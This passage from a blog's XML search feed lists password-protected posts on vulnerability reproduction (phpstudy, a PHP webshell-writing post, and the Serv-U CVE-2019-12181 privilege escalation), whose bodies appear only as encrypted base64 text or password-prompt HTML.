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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>phpstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP文件写入</title>
    <url>/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>webshell写入</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation本地提权漏洞复现</title>
    <url>/2019/08/08/CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
